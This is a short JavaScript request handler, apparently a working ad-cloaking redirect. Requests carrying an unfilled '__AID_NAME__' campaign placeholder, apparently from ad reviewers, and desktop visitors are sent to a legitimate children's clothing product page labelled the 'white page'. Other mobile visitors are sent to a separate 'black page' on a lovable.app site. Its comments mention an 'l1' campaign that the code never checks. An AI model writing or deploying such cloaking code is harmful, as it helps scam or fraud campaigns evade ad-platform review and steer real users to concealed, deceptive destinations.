export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.wilsonandfrenchy.com.au/products/frosty-friends-organic-boyleg-zipsuit?pr_prod_strat=e5_desc&pr_rec_id=d7a8bdb7f&pr_rec_pid=9070496612573&pr_ref_pid=9070430486749&pr_seq=uniform";
    const blackPageURL = "https://csshhpluv.lovable.app/";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();

  }



























